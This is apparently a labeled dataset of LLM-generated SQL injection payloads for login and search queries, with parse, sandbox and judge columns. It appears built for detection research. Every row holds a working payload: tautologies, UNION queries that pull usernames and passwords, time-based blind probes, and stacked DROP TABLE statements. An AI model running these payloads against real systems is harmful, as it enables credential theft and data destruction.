query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00000,"--"" OR 'x' = 'x'","SELECT * FROM users WHERE username = '--"" OR 'x' = 'x'' AND password = 'anything'",tautology,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00001,"admin' --""","SELECT * FROM users WHERE username = 'admin' --""' AND password = 'anything'",tautology,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00002,"; DROP TABLE users;--""","SELECT * FROM users WHERE username = '; DROP TABLE users;--""' AND password = 'anything'",tautology,login,1,0,0.0,True,default,"[""Table"", ""Identifier"", ""Semicolon"", ""Drop""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00003,"OR '1'='1'""","SELECT * FROM users WHERE username = 'OR '1'='1'""' AND password = 'anything'",tautology,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00005,"--'\"" OR 'a'='a""","SELECT * FROM users WHERE username = '--'\"" OR 'a'='a""' AND password = 'anything'",tautology,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00006,";/**/SELECT/**/*/**/FROM/**/users/**/WHERE/**/username/**=/\'admin\'/**/AND/**/password/**/=\'anything\'/**/--""","SELECT * FROM users WHERE username = ';/**/SELECT/**/*/**/FROM/**/users/**/WHERE/**/username/**=/\'admin\'/**/AND/**/password/**/=\'anything\'/**/--""' AND password = 'anything'",tautology,login,1,0,0.0,True,mysql,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00008,";//DROP TABLE users;//'""","SELECT * FROM users WHERE username = ';//DROP TABLE users;//'""' AND password = 'anything'",tautology,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00009,1' OR CAST(CHAR(1) AS BINARY) COLLATE utf8mb4_bin = CHAR(1),SELECT * FROM users WHERE username = '1' OR CAST(CHAR(1) AS BINARY) COLLATE utf8mb4_bin = CHAR(1)' AND password = 'anything',tautology,login,1,0,0.0,True,default,"[""Or"", ""Collate"", ""EQ"", ""Var"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Chr"", ""From"", ""Table"", ""Cast"", ""Star"", ""DataType"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00011,%' OR '1'='1,SELECT * FROM products WHERE name LIKE '%%' OR '1'='1%',tautology,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00012,;/*',SELECT * FROM products WHERE name LIKE '%;/*'%',tautology,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00013,--%') OR (1=1,SELECT * FROM products WHERE name LIKE '%--%') OR (1=1%',tautology,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00014,' OR 1=1 --,SELECT * FROM products WHERE name LIKE '%' OR 1=1 --%',tautology,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00016,/*' OR */1=1--,SELECT * FROM products WHERE name LIKE '%/*' OR */1=1--%',tautology,search,1,0,0.0,True,default,"[""EQ"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00017,"' OR ASCII(SUBSTRING((SELECT user FROM mysql.user LIMIT 1),1,1))>104 --","SELECT * FROM products WHERE name LIKE '%' OR ASCII(SUBSTRING((SELECT user FROM mysql.user LIMIT 1),1,1))>104 --%'",tautology,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Limit"", ""From"", ""Ascii"", ""Table"", ""Star"", ""GT"", ""Substring"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00018,"' OR (SELECT IF(LENGTH(database())=1,TRUE,FALSE)) --","SELECT * FROM products WHERE name LIKE '%' OR (SELECT IF(LENGTH(database())=1,TRUE,FALSE)) --%'",tautology,search,1,0,0.0,True,mysql,"[""Or"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Length"", ""Select"", ""Identifier"", ""Where"", ""CurrentSchema"", ""Boolean"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,nested_injection,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00019,' OR (SELECT 1 FROM users WHERE username='' AND password='') --,SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM users WHERE username='' AND password='') --%',tautology,search,1,0,0.0,True,default,"[""And"", ""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00020,"%' UNION ALL SELECT 1,2,3,4 --","SELECT * FROM products WHERE name LIKE '%%' UNION ALL SELECT 1,2,3,4 --%'",tautology,search,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,union_based,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00041,"--' UNION SELECT NULL, NULL, NULL, NULL--","SELECT * FROM users WHERE username = '--' UNION SELECT NULL, NULL, NULL, NULL--' AND password = 'anything'",union_based,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00042,"' OR '1'='1' UNION ALL SELECT username, password, NULL, NULL FROM another_table --","SELECT * FROM users WHERE username = '' OR '1'='1' UNION ALL SELECT username, password, NULL, NULL FROM another_table --' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Or"", ""Null"", ""EQ"", ""Union"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00043,'; DROP TABLE IF EXISTS temp_table; --,SELECT * FROM users WHERE username = ''; DROP TABLE IF EXISTS temp_table; --' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Drop"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00044,' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='admin')--,SELECT * FROM users WHERE username = '' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='admin')--' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00045,"' UNION SELECT CONCAT(username, ':', password) AS credentials FROM users --","SELECT * FROM users WHERE username = '' UNION SELECT CONCAT(username, ':', password) AS credentials FROM users --' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Concat"", ""Select"", ""Identifier"", ""Where"", ""Alias"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00046,"--' UNION SELECT NULL, NULL, (SELECT password FROM admin), NULL--","SELECT * FROM users WHERE username = '--' UNION SELECT NULL, NULL, (SELECT password FROM admin), NULL--' AND password = 'anything'",union_based,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00047,' OR (SELECT username FROM users WHERE LENGTH(password) > 0) LIMIT 1--,SELECT * FROM users WHERE username = '' OR (SELECT username FROM users WHERE LENGTH(password) > 0) LIMIT 1--' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Length"", ""Select"", ""Identifier"", ""Where"", ""Limit"", ""From"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,nested_injection,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00048,; SELECT * FROM secret_data WHERE CAST(LENGTH(username) AS VARCHAR) = '1'--,SELECT * FROM users WHERE username = '; SELECT * FROM secret_data WHERE CAST(LENGTH(username) AS VARCHAR) = '1'--' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Length"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Cast"", ""Star"", ""DataType"", ""Column""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00050,"--' UNION SELECT username, email, password, salt FROM user_details--","SELECT * FROM users WHERE username = '--' UNION SELECT username, email, password, salt FROM user_details--' AND password = 'anything'",union_based,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00051,' OR EXISTS(SELECT * FROM system_tables WHERE table_name='hidden_admin')--,SELECT * FROM users WHERE username = '' OR EXISTS(SELECT * FROM system_tables WHERE table_name='hidden_admin')--' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00052,"'; WAITFOR DELAY '0:0:10' UNION ALL SELECT username, password, role FROM staff_members--","SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:10' UNION ALL SELECT username, password, role FROM staff_members--' AND password = 'anything'",union_based,login,1,0,0.0,False,,[],False,static_only,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00054,' OR 1=1 AND EXISTS(SELECT * FROM orders WHERE user_id=1)/*,SELECT * FROM products WHERE name LIKE '%' OR 1=1 AND EXISTS(SELECT * FROM orders WHERE user_id=1)/*%',union_based,search,1,0,0.0,False,,[],False,static_only,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00055,"1' UNION SELECT username, password FROM admin--","SELECT * FROM products WHERE name LIKE '%1' UNION SELECT username, password FROM admin--%'",union_based,search,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00056,"' AND (SELECT 1 FROM (UNION SELECT 1, COUNT(*), 1 FROM employees GROUP BY department)) --","SELECT * FROM products WHERE name LIKE '%' AND (SELECT 1 FROM (UNION SELECT 1, COUNT(*), 1 FROM employees GROUP BY department)) --%'",union_based,search,1,0,0.0,False,,[],False,static_only,union_based,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00057,"--' OR 1=1 UNION ALL SELECT username, email FROM customers/*","SELECT * FROM products WHERE name LIKE '%--' OR 1=1 UNION ALL SELECT username, email FROM customers/*%'",union_based,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00058,' OR EXISTS(SELECT * FROM suppliers WHERE contact_name LIKE '%admin%')--,SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT * FROM suppliers WHERE contact_name LIKE '%admin%')--%',union_based,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Like"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00059,"' AND 1=(SELECT CASE WHEN SUBSTRING((SELECT username FROM admin LIMIT 0,1),1,1)='a' THEN 1 ELSE 2 END) OR '1'='1'","SELECT * FROM products WHERE name LIKE '%' AND 1=(SELECT CASE WHEN SUBSTRING((SELECT username FROM admin LIMIT 0,1),1,1)='a' THEN 1 ELSE 2 END) OR '1'='1'%'",union_based,search,1,0,0.0,True,default,"[""And"", ""Case"", ""Or"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Offset"", ""Limit"", ""From"", ""Table"", ""Star"", ""Substring"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00060,' OR (SELECT LENGTH((SELECT password FROM admin WHERE admin_id=1))) > 0#,SELECT * FROM products WHERE name LIKE '%' OR (SELECT LENGTH((SELECT password FROM admin WHERE admin_id=1))) > 0#%',union_based,search,1,0,0.0,True,mysql,"[""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Length"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,nested_injection,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00061,"--' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'","SELECT * FROM products WHERE name LIKE '%--' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'%'",union_based,search,1,0,0.0,True,default,[],True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00062,"' OR (SELECT 1 FROM (UNION SELECT 1, COUNT(*), 1 FROM products GROUP BY price HAVING COUNT(*) > 1))","SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM (UNION SELECT 1, COUNT(*), 1 FROM products GROUP BY price HAVING COUNT(*) > 1))%'",union_based,search,1,0,0.0,False,,[],False,static_only,union_based,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00094,--' OR 1=1; --,SELECT * FROM users WHERE username = '--' OR 1=1; --' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00095,"'; /**/ IF(1=1, SLEEP(5), NULL);/**/","SELECT * FROM users WHERE username = ''; /**/ IF(1=1, SLEEP(5), NULL);/**/' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,"[""Null"", ""EQ"", ""If"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00096,"'"" OR 1=1/*","SELECT * FROM users WHERE username = ''"" OR 1=1/*' AND password = 'anything'",blind_boolean,login,1,0,0.0,False,,[],False,static_only,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00097,"; --' OR ASCII(SUBSTRING(password, 1, 1)) > 50 --","SELECT * FROM users WHERE username = '; --' OR ASCII(SUBSTRING(password, 1, 1)) > 50 --' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,"[""Semicolon""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00098,"' OR EXISTS(SELECT 1 FROM (SELECT CASE WHEN (ASCII(SUBSTRING(username, 1, 1)) > 97) THEN 1 ELSE 0 END AS res) WHERE res = 1)","SELECT * FROM users WHERE username = '' OR EXISTS(SELECT 1 FROM (SELECT CASE WHEN (ASCII(SUBSTRING(username, 1, 1)) > 97) THEN 1 ELSE 0 END AS res) WHERE res = 1)' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,"[""Case"", ""Or"", ""If"", ""Identifier"", ""Star"", ""Paren"", ""Literal"", ""From"", ""Ascii"", ""Substring"", ""Table"", ""Exists"", ""GT"", ""Column"", ""EQ"", ""Subquery"", ""Select"", ""Alias"", ""Where""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00099,"--' OR CHAR_LENGTH((SELECT SUBSTRING(password, 1, 1) FROM users LIMIT 1)) > 0 --","SELECT * FROM users WHERE username = '--' OR CHAR_LENGTH((SELECT SUBSTRING(password, 1, 1) FROM users LIMIT 1)) > 0 --' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00100,' OR (SELECT COUNT(*) FROM tables WHERE table_schema = DATABASE() AND table_name = 'users') > 0,SELECT * FROM users WHERE username = '' OR (SELECT COUNT(*) FROM tables WHERE table_schema = DATABASE() AND table_name = 'users') > 0' AND password = 'anything',blind_boolean,login,1,0,0.0,True,mysql,"[""And"", ""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""CurrentSchema"", ""Count"", ""From"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,nested_injection,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00102,' OR EXISTS(SELECT 1 FROM users WHERE username LIKE 'a%' AND LENGTH(password) = 1),SELECT * FROM users WHERE username = '' OR EXISTS(SELECT 1 FROM users WHERE username LIKE 'a%' AND LENGTH(password) = 1)' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,"[""And"", ""Or"", ""EQ"", ""Literal"", ""Length"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Like"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00103,"--' OR (SELECT 1 FROM users WHERE id = 1 AND (SELECT 1 FROM (SELECT CASE WHEN ASCII(SUBSTRING(password, 1, 1)) <= 50 THEN 1 ELSE 0 END AS res) WHERE res = 0))""","SELECT * FROM users WHERE username = '--' OR (SELECT 1 FROM users WHERE id = 1 AND (SELECT 1 FROM (SELECT CASE WHEN ASCII(SUBSTRING(password, 1, 1)) <= 50 THEN 1 ELSE 0 END AS res) WHERE res = 0))""' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00104,"OR '1'='1';/**/"" + String.fromCharCode(10) + ""--""","SELECT * FROM users WHERE username = 'OR '1'='1';/**/"" + String.fromCharCode(10) + ""--""' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Semicolon"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00105,OR 'admin' LIKE 'admin'; WAITFOR DELAY '0:0:5,SELECT * FROM users WHERE username = 'OR 'admin' LIKE 'admin'; WAITFOR DELAY '0:0:5' AND password = 'anything',blind_boolean,login,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00106,"1' AND 8255 IN (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users)","SELECT * FROM products WHERE name LIKE '%1' AND 8255 IN (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users)%'",blind_boolean,search,1,0,0.0,True,default,"[""And"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Ascii"", ""In"", ""Table"", ""Star"", ""Substring"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00107,1' AND EXISTS(SELECT * FROM tables WHERE table_name = 'users') --,SELECT * FROM products WHERE name LIKE '%1' AND EXISTS(SELECT * FROM tables WHERE table_name = 'users') --%',blind_boolean,search,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00108,1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION ALL SELECT 2 WHERE CHAR_LENGTH(name) > 1)) > 1 --,SELECT * FROM products WHERE name LIKE '%1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION ALL SELECT 2 WHERE CHAR_LENGTH(name) > 1)) > 1 --%',blind_boolean,search,1,0,0.0,True,default,"[""And"", ""Union"", ""EQ"", ""Subquery"", ""Literal"", ""Length"", ""Select"", ""Identifier"", ""Where"", ""Count"", ""From"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,union_based,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00109,"1' AND DBMS_LOB.INSTR(description, 'admin', 1, 1) > 0 --","SELECT * FROM products WHERE name LIKE '%1' AND DBMS_LOB.INSTR(description, 'admin', 1, 1) > 0 --%'",blind_boolean,search,1,0,0.0,True,default,"[""And"", ""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Dot"", ""Where"", ""From"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00112,' AND 8888 = (SELECT 1 FROM (SELECT 2 AS a UNION SELECT 3 AS b)),SELECT * FROM products WHERE name LIKE '%' AND 8888 = (SELECT 1 FROM (SELECT 2 AS a UNION SELECT 3 AS b))%',blind_boolean,search,1,0,0.0,True,default,"[""And"", ""Union"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Alias"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00115,' AND (SELECT 1 FROM (SELECT 2 UNION SELECT 3)) --,SELECT * FROM products WHERE name LIKE '%' AND (SELECT 1 FROM (SELECT 2 UNION SELECT 3)) --%',blind_boolean,search,1,0,0.0,True,default,"[""And"", ""Union"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00148,"1' AND IF(SLEEP(5), 1=1, 1=0) --","SELECT * FROM users WHERE username = '1' AND IF(SLEEP(5), 1=1, 1=0) --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""If"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00149,"1' OR BENCHMARK(5000000, ENCODE('message', 'secret')) #","SELECT * FROM users WHERE username = '1' OR BENCHMARK(5000000, ENCODE('message', 'secret')) #' AND password = 'anything'",blind_time,login,1,0,0.0,True,mysql,"[""Or"", ""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Encode"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00150,1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%users%') > 0 --,SELECT * FROM users WHERE username = '1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%users%') > 0 --' AND password = 'anything',blind_time,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Count"", ""From"", ""Like"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00151,"1' OR SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a' --","SELECT * FROM users WHERE username = '1' OR SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a' --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Limit"", ""From"", ""Table"", ""Star"", ""Substring"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00152,"1' AND EXISTS(SELECT 1 FROM users WHERE username = 'admin' AND password = LPAD('', 5, '0')) --","SELECT * FROM users WHERE username = '1' AND EXISTS(SELECT 1 FROM users WHERE username = 'admin' AND password = LPAD('', 5, '0')) --' AND password = 'anything'",blind_time,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Pad"", ""Where"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00153,1' AND SLEEP(5) --,SELECT * FROM users WHERE username = '1' AND SLEEP(5) --' AND password = 'anything',blind_time,login,1,0,0.0,True,default,"[""And"", ""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00154,"1' OR BENCHMARK(5000000, CONCAT(CHAR(66), CHAR(67), CHAR(79), CHAR(101))) #","SELECT * FROM users WHERE username = '1' OR BENCHMARK(5000000, CONCAT(CHAR(66), CHAR(67), CHAR(79), CHAR(101))) #' AND password = 'anything'",blind_time,login,1,0,0.0,True,mysql,"[""Or"", ""EQ"", ""Anonymous"", ""Literal"", ""Concat"", ""Select"", ""Identifier"", ""Where"", ""Chr"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00155,1' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%users%') --,SELECT * FROM users WHERE username = '1' AND (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%users%') --' AND password = 'anything',blind_time,login,1,0,0.0,True,default,"[""And"", ""Case"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Like"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
